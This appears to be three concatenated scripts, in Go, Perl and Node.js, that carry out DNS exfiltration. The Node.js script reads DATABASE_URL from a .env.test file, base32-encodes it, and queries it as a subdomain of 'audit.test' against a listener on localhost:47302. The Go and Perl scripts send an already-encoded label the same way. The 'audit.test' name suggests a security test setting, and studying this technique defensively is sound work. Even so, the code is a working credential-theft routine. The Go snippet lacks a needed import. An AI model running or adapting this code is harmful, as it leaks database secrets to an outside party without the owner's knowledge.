import (
	"fmt"
	"net"
	"time"
)

func main() {
	query := "iraviqkcifjukx2vkjgd24dpon2go4tfom5c6l3bmrwws3r2inau4qksleww.audit.test"

	// Create a DNS client with custom resolver
	client := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Second * 5,
			}
			return d.Dial(network, "localhost:47302")
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	ips, err := client.LookupHost(ctx, query)
	if err != nil {
		fmt.Printf("Error looking up %s: %v\n", query, err)
	} else {
		fmt.Printf("Result for %s: %v\n", query, ips)
	}
}

#!/usr/bin/perl
use strict;
use warnings;
use Socket;
use IO::Socket::INET;

my $query = "iraviqkcifjukx2vkjgd24dpon2go4tfom5c6l3bmrwws3r2inau4qksleww.audit.test";
my $server = 'localhost';
my $port = 47302;

# Create a simple DNS query packet - Type A record (1), Class IN (1)
my $transaction_id = int(rand(65536));
my $flags = 0x0100;  # Standard query, recursion desired
my $questions = 1;
my $answers = 0;
my $authority_rrs = 0;
my $additional_rrs = 0;

# Build DNS packet
my $packet = pack('n6', $transaction_id, $flags, $questions, $answers, $authority_rrs, $additional_rrs);
my @labels = split(/\./, $query);
foreach my $label (@labels) {
    $packet .= pack('C', length($label)) . $label;
}
$packet .= pack('C', 0);  # null terminator
$packet .= pack('nn', 1, 1);  # QTYPE=A (1), QCLASS=IN (1)

# Create UDP socket
socket(my $socket, PF_INET, SOCK_DGRAM, getprotobyname('udp')) or die "socket: $!";
my $addr = sockaddr_in($port, inet_aton($server));

# Set timeout
my $timeout = 5;
setsockopt($socket, SOL_SOCKET, SO_RCVTIMEO, pack('l!l!', $timeout, 0)) or die "setsockopt: $!";

# Send query
send($socket, $packet, 0, $addr) or die "send: $!";

# Try to receive response
my $response;
my $from_addr = recv($socket, $response, 512, 0);

if ($from_addr) {
    print "Received DNS response from $server:$port\n";
    # Parse response (simplified - just check that we got something)
    if (length($response) > 12) {
        print "Response received successfully (length: " . length($response) . " bytes)\n";
    }
} else {
    print "No response received from $server:$port (timeout or service not available)\n";
    # Try TCP as fallback
    print "Trying TCP connection...\n";
    my $tcp_socket = IO::Socket::INET->new(
        PeerAddr => $server,
        PeerPort => $port,
        Proto    => 'tcp',
        Timeout  => 5
    );
    if ($tcp_socket) {
        print "TCP connection to $server:$port successful\n";
        # For DNS over TCP, we need to send length first
        my $length = pack('n', length($packet));
        print $tcp_socket $length . $packet;
        # Read response
        my $buf;
        $tcp_socket->recv($buf, 2);
        my $resp_len = unpack('n', $buf);
        if ($resp_len > 0) {
            $tcp_socket->recv($buf, $resp_len);
            print "TCP DNS response received (length: $resp_len bytes)\n";
        }
        close($tcp_socket);
    } else {
        print "TCP connection failed: $@\n";
    }
}

close($socket);

const dgram = require('dgram');
const dns = require('dns');

// Get the lookup string L
const fs = require('fs');
const { execSync } = require('child_process');

// Extract DATABASE_URL from .env.test and process it
try {
    // Read .env.test file
    const envContent = fs.readFileSync('.env.test', 'utf8');
    const dbLine = envContent.split('\n').find(line => line.trim().startsWith('DATABASE_URL='));
    if (!dbLine) {
        console.error('DATABASE_URL not found in .env.test');
        process.exit(1);
    }

    // Extract just the DATABASE_URL value
    const dbUrl = dbLine.split('=')[1];

    // Process through base32 and formatting
    const { spawnSync } = require('child_process');

    // Create the lookup string using the same pipeline
    const echo = spawnSync('echo', [dbUrl]);
    const base32 = spawnSync('base32', { input: echo.stdout });
    const tr1 = spawnSync('tr', ['-d', '='], { input: base32.stdout });
    const tr2 = spawnSync('tr', ['A-Z', 'a-z'], { input: tr1.stdout });
    const head = spawnSync('head', ['-c', '60'], { input: tr2.stdout });

    const lookupString = head.stdout.toString().trim();
    console.log(`Lookup string: ${lookupString}`);

    // Now perform DNS lookup
    const queryName = `${lookupString}.audit.test`;
    console.log(`Querying: ${queryName}`);

    // Try using Node's dns module first
    dns.resolve(queryName, (err, addresses) => {
        if (err) {
            console.log(`DNS resolve error: ${err.message}`);

            // Try raw DNS query on port 47302
            console.log('Trying raw DNS query on port 47302...');
            makeRawDnsQuery(queryName);
        } else {
            console.log(`DNS resolve result: ${addresses}`);
        }
    });

} catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
}

function makeRawDnsQuery(queryName) {
    // Create a simple DNS query packet
    const client = dgram.createSocket('udp4');

    // Build DNS query (simplified)
    const transactionId = 0x1234;
    const flags = 0x0100; // Standard query
    const questions = 0x0001;
    const answerRRs = 0x0000;
    const authorityRRs = 0x0000;
    const additionalRRs = 0x0000;

    // Start building packet
    let packet = Buffer.alloc(12);
    packet.writeUInt16BE(transactionId, 0);
    packet.writeUInt16BE(flags, 2);
    packet.writeUInt16BE(questions, 4);
    packet.writeUInt16BE(answerRRs, 6);
    packet.writeUInt16BE(authorityRRs, 8);
    packet.writeUInt16BE(additionalRRs, 10);

    // Add query name
    const parts = queryName.split('.');
    for (const part of parts) {
        const length = Buffer.from([part.length]);
        const namePart = Buffer.from(part);
        packet = Buffer.concat([packet, length, namePart]);
    }
    packet = Buffer.concat([packet, Buffer.from([0])]); // Null terminator

    // Query type A (1), class IN (1)
    const qtype = Buffer.alloc(2);
    qtype.writeUInt16BE(1, 0);
    const qclass = Buffer.alloc(2);
    qclass.writeUInt16BE(1, 0);
    packet = Buffer.concat([packet, qtype, qclass]);

    client.send(packet, 47302, 'localhost', (err) => {
        if (err) {
            console.error(`Send error: ${err}`);
            client.close();
        } else {
            console.log('DNS query sent');

            // Set timeout for response
            client.setTimeout(5000);

            client.on('timeout', () => {
                console.log('Timeout waiting for DNS response');
                client.close();
            });

            client.on('message', (msg, rinfo) => {
                console.log(`Received ${msg.length} bytes from ${rinfo.address}:${rinfo.port}`);
                console.log(`Response: ${msg.toString('hex')}`);
                client.close();
            });

            client.on('error', (err) => {
                console.error(`Client error: ${err}`);
                client.close();
            });
        }
    });
}

